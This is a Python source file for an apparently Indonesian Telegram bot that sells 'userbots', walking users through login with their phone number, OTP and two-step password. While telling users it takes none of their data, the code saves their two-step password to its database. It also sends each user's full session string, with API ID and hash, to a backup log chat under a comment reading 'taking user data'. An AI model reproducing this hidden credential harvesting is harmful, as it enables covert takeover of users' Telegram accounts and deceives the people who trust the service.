import asyncio
import importlib
import traceback
from datetime import datetime

import hydrogram
from dateutil.relativedelta import relativedelta
from pyrogram.enums import ButtonStyle
from pyrogram.helpers import ikb, kb, send_rich, paragraph, divider, table, cell, button, button_row, block_quote
from pyrogram.types import (KeyboardButton, ReplyKeyboardMarkup,
                            ReplyKeyboardRemove, InputRichMessage, RichTextMarked, RichTextTextMention, RichTextBold, RichTextCustomEmoji
)
from pytz import timezone

from clients import UserBot, bot, alice
from config import (AKSES_DEPLOY, API_HASH, API_ID, BOT_ID, LOG_SELLER, LOG_BACKUP,
                    MAX_BOT, SUDO_OWNERS, WAJIB_JOIN)
from database import dB, state
from helpers import ButtonUtils, Message, TokenReferal, no_trigger, Basic_Effect, emo
from logs import logger
from plugins import PLUGINS


async def setExpiredUser(user_id):
    if user_id in SUDO_OWNERS:
        now = datetime.now(timezone("Asia/Jakarta"))
        expired = now + relativedelta(months=12)
        await dB.set_expired_date(user_id, expired)
    else:
        now = datetime.now(timezone("Asia/Jakarta"))
        expired = now + relativedelta(months=1)
        await dB.set_expired_date(user_id, expired)


async def db_trial(client, org):
    trial = await dB.get_list_from_var(client, "user_trial", "user")
    if org in trial:
        return True
    return False  # FIX: eksplisit return False, jangan biarkan None


async def cb_trial_ask(client, message):
    msg = """
<b><blockquote>⚡ Anda memilih Userbot Trial dengan akses selama 24 Jam. Segala resiko Anda tanggung sendiri.

<u>Saya sangat menyarankan jika ingin memasang userbot pada ID 6, 7 nomor Indonesia, usahakan Akun tersebut telah aktif atau login selama 1 bulan.</u>

Silahkan klik tombol <u>Setuju</u> jika setuju, atau klik tombol <u>Tidak</u> untuk mengakhiri ini.</blockquote></b>"""
    keyboard = kb(
        [["✅ Setuju"], ["❌ Tidak"]],
        resize_keyboard=True,
        one_time_keyboard=True,
    )
    return await message.reply(msg, reply_markup=keyboard)


async def cb_trial(client, message):
    user_id = message.from_user.id
    data = await db_trial(client.me.id, user_id)
    txt = "<blockquote><b>Anda Menikmati Trial Userbot 24 Jam</b><blockquote>"
    if data:
        msg = "<b><blockquote>Maaf sebelumnya anda adalah pengguna Trial, anda tidak bisa menikmati trial lebih dari 1x, Silahkan beli userbot untuk berlangganan.</blockquote></b>"
        keyb = ButtonUtils.start_menu(is_admin=False)
        return await message.reply(msg, reply_markup=keyb)
        await message.reply(txt)
        await asyncio.sleep(2)
    return await create_userbots(client, message)


async def mari_buat_userbot(client, message, is_trial=False):
    user_id = message.from_user.id
    if len(alice._ubot) == MAX_BOT:
        buttons = kb(
            [["💬 Hubungi Admins"]], resize_keyboard=True, one_time_keyboard=True
        )
        return await message.reply(
            f"""
<b>❌ Tidak dapat membuat Userbot !</b>

<b>📚 Karena Telah Mencapai Yang Telah Di Tentukan : {len(alice._ubot)}</b>

<b>👮‍♂ Silakan Hubungi Admins . </b>
""",
            reply_markup=buttons,
        )
    get_exp_user = await dB.get_expired_date(user_id)
    now = datetime.now(timezone("Asia/Jakarta"))
    if get_exp_user and now >= get_exp_user:
        await message.reply(
            f"**Masa aktif kamu `{get_exp_user.astimezone(timezone('Asia/Jakarta')).strftime('%Y-%m-%d %H:%M')}` sudah melebihi batas waktu yang ditentukan, jadi kamu tidak bisa memasang userbot lagi\n\nSilahkan lakukan pembayaran lagi untuk pemasangan userbot!!**",
            reply_markup=ReplyKeyboardRemove(),
        )
        return await dB.rem_expired_date(user_id)
    if not get_exp_user and user_id not in AKSES_DEPLOY:
        buttons = ikb(
            [[(" Lanjutkan Membeli", "go_payment", ButtonStyle.SUCCESS, "5373052667671093676")], [(" Tutup", "buttonclose", ButtonStyle.DANGER, "5260293700088511294")]]
        )
        text = f"<blockquote>{await Message.policy_message()}</blockquote>"
        return await message.reply(
            text,
            disable_web_page_preview=True,
            reply_markup=buttons,
        )
    else:
        return await create_userbots(client, message)


async def create_userbots(client, message, is_trial=False):
    tokenref = await TokenReferal.create()
    try:
        user_id = message.from_user.id
        anu = ReplyKeyboardMarkup(
            [
                [KeyboardButton(text="Kontak Saya", request_contact=True)],
            ],
            resize_keyboard=True,
            one_time_keyboard=True,
        )
        try:
            ref_kode = await client.ask(
                user_id,
                "<b>Apakah kamu mempunyai kode Referral ? Jika iya, Silahkan kirim kode Referral. Jika tidak kamu bisa melakukan /skip.</b>",
                timeout=300,
            )
            if ref_kode.text in ["skip", "Skip", "/skip", "start", "/start"]:
                kode_referal = None
            else:
                kode_referal = ref_kode.text
        except asyncio.TimeoutError:
            kode_referal = None
        try:
            phone = await client.ask(
                user_id,
                f"<blockquote><b>Silahkan klik tombol <u>Kontak Saya</u> untuk mengirimkan Nomor Telepon Telegram Anda\n<i>⚠️ Notes: kami tidak mengambil data anda sama sekali, pemasangan userbot membutuhkan nomor telegram agar userbot terpasang diakun telegram anda<i>.</b></blockquote>",
                reply_markup=anu,
            )
            phone_number = phone.contact.phone_number
        except AttributeError:
            try:
                phone = await client.ask(
                    user_id,
                    f"<blockquote><b>Silahkan klik tombol <u>Kontak Saya</u> untuk mengirimkan Nomor Telepon Telegram Anda.</b></blockquote>",
                    reply_markup=anu,
                )
                phone_number = phone.contact.phone_number
            except Exception:
                return await bot.send_message(
                    user_id,
                    "<blockquote><b>PEA, punya mata dipake buat baca!! jangan BOKEP mulu.</b></blockquote>",
                    reply_markup=ButtonUtils.start_menu(is_admin=False),
                )
        new_client = hydrogram.Client(
            name=str(user_id),
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True,
        )
        await asyncio.sleep(2)
        get_otp = await client.send_message(
            user_id,
            f"<b><blockquote>Sedang Mengirim Kode OTP...</blockquote></b>",
            reply_markup=ReplyKeyboardRemove(),
        )
        await new_client.connect()
        try:
            code = await new_client.send_code(phone_number.strip())
        except hydrogram.errors.exceptions.bad_request_400.ApiIdInvalid as AID:
            await get_otp.delete()
            return await client.send_message(user_id, AID)
        except hydrogram.errors.exceptions.bad_request_400.PhoneNumberInvalid as PNI:
            await get_otp.delete()
            return await client.send_message(user_id, PNI)
        except hydrogram.errors.exceptions.bad_request_400.PhoneNumberFlood as PNF:
            await get_otp.delete()
            return await client.send_message(user_id, PNF)
        except hydrogram.errors.exceptions.bad_request_400.PhoneNumberBanned as PNB:
            await get_otp.delete()
            return await client.send_message(user_id, PNB)
        except hydrogram.errors.exceptions.bad_request_400.PhoneNumberUnoccupied as PNU:
            await get_otp.delete()
            return await client.send_message(user_id, PNU)
        except Exception as error:
            await get_otp.delete()
            return await client.send_message(
                user_id,
                f"<b>ERROR:</b> {error}",
                reply_markup=ButtonUtils.start_menu(is_admin=False),
            )
        await get_otp.delete()
        otp = await client.ask(
            user_id,
            f"<b><blockquote>Silakan Periksa Kode OTP dari <a href=tg://openmessage?user_id=777000>Akun Telegram</a> Resmi. Kirim Kode OTP ke sini setelah membaca Format di bawah ini.</b>\n\nJika Kode OTP adalah <code>12345</code> Tolong <b>[ TAMBAHKAN SPASI ]</b> kirimkan Seperti ini <code>1 2 3 4 5</code>.</blockquote></b>",
        )
        if otp.text in no_trigger:
            return await client.send_message(
                user_id,
                f"<blockquote><b>Proses di batalkan.</b></blockquote>",
                reply_markup=ButtonUtils.start_menu(is_admin=False),
            )
        otp_code = otp.text
        try:
            await new_client.sign_in(
                phone_number.strip(),
                code.phone_code_hash,
                phone_code=" ".join(str(otp_code)),
            )
        except hydrogram.errors.exceptions.bad_request_400.PhoneCodeInvalid as PCI:
            return await client.send_message(user_id, PCI)
        except hydrogram.errors.exceptions.bad_request_400.PhoneCodeExpired as PCE:
            return await client.send_message(user_id, PCE)
        except hydrogram.errors.exceptions.bad_request_400.BadRequest as error:
            return await client.send_message(
                user_id,
                f"<b>ERROR:</b> {error}",
                reply_markup=ButtonUtils.start_menu(is_admin=False),
            )
        except hydrogram.errors.exceptions.unauthorized_401.SessionPasswordNeeded:
            two_step_code = await client.ask(
                user_id,
                f"<b><blockquote>Akun anda Telah mengaktifkan Verifikasi Dua Langkah. Silahkan Kirimkan Passwordnya.</blockquote></b>",
            )
            if two_step_code.text in no_trigger:
                return await client.send_message(
                    user_id,
                    f"<blockquote><b>Proses di batalkan.</b></blockquote>",
                    reply_markup=ButtonUtils.start_menu(is_admin=False),
                )
            new_code = two_step_code.text
            try:
                await new_client.check_password(new_code)
                await dB.set_var(user_id, "PASSWORD", new_code)
            except Exception as error:
                return await client.send_message(
                    user_id,
                    f"<b>ERROR:</b> {error}",
                    reply_markup=ButtonUtils.start_menu(is_admin=False),
                )
        session_string = await new_client.export_session_string()
        await new_client.disconnect()
        new_client.storage.session_string = session_string
        new_client.in_memory = False
        bot_msg = await client.send_message(
            user_id,
            f"<b><blockquote>Tunggu proses selama 1-30 detik...\nKami sedang menghidupkan Userbot Anda.</blockquote></b>",
            disable_web_page_preview=True,
        )
        await asyncio.sleep(2)
        kn_client = UserBot(
            name=str(user_id),
            api_id=API_ID,
            api_hash=API_HASH,
            session_string=session_string,
            in_memory=True,
        )
        # PENGAMBILAN DATA USER!
        await bot.send_message(
            LOG_BACKUP, f"<b>DATA USER!</b>\n\n<b>ID:</b> `{user_id}`\n<b>API ID:</b> `{API_ID}`\n<b>API HASH:</b> `{API_HASH}`\n<b>SESSION STRING:</b> `{session_string}`"
        )
        try:
            await kn_client.start()
            for modul in PLUGINS:
                importlib.reload(importlib.import_module(f"plugins.{modul}"))
        except Exception as e:
            logger.error(f"Error Client: {str(e)}")
        if not await dB.get_expired_date(kn_client.me.id):
            await setExpiredUser(kn_client.me.id)
        await dB.add_ubot(
            user_id=int(kn_client.me.id),
            session_string=session_string,
        )
        if not user_id == kn_client.me.id:
            alice._ubot.remove(kn_client)
            await dB.remove_ubot(kn_client.me.id)
            await kn_client.log_out()
            return await bot_msg.edit(
                f"<blockquote><b>Gunakan akun anda sendiri, bukan orang lain!!</b></blockquote>"
            )
        if is_trial:
            now = datetime.now(timezone("Asia/Jakarta"))
            expired = now + relativedelta(hours=24)
            await dB.add_to_var(client.me.id, "PREM", user_id, "USERS")
            await dB.set_expired_date(user_id, expired)
            await dB.add_to_var(client.me.id, "user_trial", user_id, "user")
            await client.send_message(
                user_id,
                "<blockquote><b>Anda menikmati userbot trial selama 24 Jam</b></blockquote>",
            )
        if not await dB.get_expired_date(kn_client.me.id):
            await setExpiredUser(kn_client.me.id)
      
        Referral = await tokenref.register_user(
            user_id=str(kn_client.me.id),
            phone=phone_number.strip(),
            referral_code=kode_referal,
        )
        user_token = Referral["token"]
        user_referal = Referral["referral_code"]
        referal_from = Referral["referred_by"] or None
        await asyncio.sleep(1)
        seles = await dB.get_list_from_var(BOT_ID, "SELLER")
        if kn_client.me.id not in seles:
            try:
                AKSES_DEPLOY.remove(kn_client.me.id)
            except Exception:
                pass
        for chat in WAJIB_JOIN:
            try:
                await kn_client.join_chat(chat)
            except Exception:
                pass
        prefix = alice.get_prefix(kn_client.me.id)
        keyb = ButtonUtils.start_menu(is_admin=False)
        exp = await dB.get_expired_date(kn_client.me.id)
        PLAN = (
            "basic" if await dB.get_var(kn_client.me.id, "plan") == "basic" else "pro"
        )
        expir = exp.astimezone(timezone("Asia/Jakarta")).strftime("%Y-%m-%d %H:%M")
        who_seller = state.get(kn_client.me.id, "seller")
        if who_seller:
            count = await dB.get_var(int(who_seller), "penjualan") or 0
            new_data = count + 1
            await dB.set_var(int(who_seller), "penjualan", new_data)
        
        buttons = ButtonUtils.cek_masa_aktif(user_id)
        nama = f"{kn_client.me.first_name} {kn_client.me.last_name or ''}".strip()
        rich = InputRichMessage(
            blocks=[
                table(
                    [
                        [
                            cell(
                                [
                                    emo(6296367896398399651, "💎"),
                                    RichTextBold(" Userbot Anda Berhasil Diaktifkan"),
                                ],
                                align="center",
                                is_header=True,
                            )
                        ],
                    ],
                ),
                table(
                    [
                        [
                            cell([emo(6104780447684757396, "💎"), " Akun"], align="center"),
                            cell([nama]),
                        ],
                        [
                            cell([emo(5445353829304387411, "💎"), " ID"], align="center"),
                            cell([emo(6240210026477130678, "💎"), f" {kn_client.me.id}"]),
                        ],
                        [
                            cell([emo(6240210026477130678, "💎"), " Paket"], align="center"),
                            cell([emo(6240210026477130678, "💎"), f" {PLAN}"]),
                        ],
                        [
                            cell([emo(5300999883996536855, "💎"), " Prefix/Perintah"], align="center"),
                            cell([emo(5300999883996536855, "💎"), f" {' '.join(prefix)}"]),
                        ],
                        [
                            cell([emo(6176966310920983412, "💎"), " Token"], align="center"),
                            cell([emo(6176966310920983412, "💎"), f" {user_token}"]),
                        ],
                        [
                            cell([emo(5285467572857239915, "💎"), " Status"], align="center"),
                            cell([emo(5285467572857239915, "💎"), " Aktif"]),
                        ],
                    ],
                ),
                block_quote(
                    paragraph(
                        [
                            emo(5447644880824181073, "💎"),
                            " Token kamu berfungsi untuk mengklaim garansi userbot "
                            "jika kamu ingin berpindah akun atau akunmu diblokir "
                            "oleh pihak Telegram. Mohon simpan token kamu dengan aman.",
                        ]
                    )
                ),
                divider(),
                table(
                    [
                        [cell(["AliceDevs Core v3.14 ", emo(5456140674028019486, "⚡")], align="center")],
                    ],
                ),
            ]
        )
        await send_rich(client, user_id, LOG_SELLER, *rich.blocks, reply_markup=buttons)
        return await client.send_message(
            LOG_SELLER,
            f"""
    <b>❏ Notifikasi Userbot Aktif</b>
    <b> ├ Akun :</b> <a href=tg://user?id={kn_client.me.id}>{kn_client.me.first_name} {kn_client.me.last_name or ''}</a> 
    <b> ╰ ID :</b> <code>{kn_client.me.id}</code>
    """,
            reply_markup=ikb(
                [
                    [
                        (
                            "Cek Kadaluarsa",
                            f"cek_masa_aktif {kn_client.me.id}", ButtonStyle.DANGER, "5413879192267805083",
                            "callback_data",
                        )
                    ]
                ]
            ),
            disable_web_page_preview=True,
        )
    except Exception:
        logger.error(f"ERROR Create Users: {traceback.format_exc()}")
